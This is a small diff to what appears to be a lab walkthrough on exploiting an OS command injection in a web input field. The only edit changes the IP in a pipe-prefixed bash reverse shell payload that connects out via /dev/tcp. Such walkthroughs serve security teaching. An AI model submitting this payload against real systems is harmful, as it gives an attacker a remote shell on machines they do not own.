@@ -46,7 +46,7 @@ To deliver the single-line reverse shell payload, exploit the OS command injecti
 If you remember, the vulnerability was identified to be a HTML input field that could be exploited by prepending a payload with the pipe (|) metacharacter.<br>
 For example, we would deliver our single-line reverse shell payload by submitting the following in the input field:
 ```
-|bash -c 'bash -i >& /dev/tcp/172.16.10.12/1337 0>&1'
+|bash -c 'bash -i >& /dev/tcp/172.16.10.1/1337 0>&1'
 ```
 
 
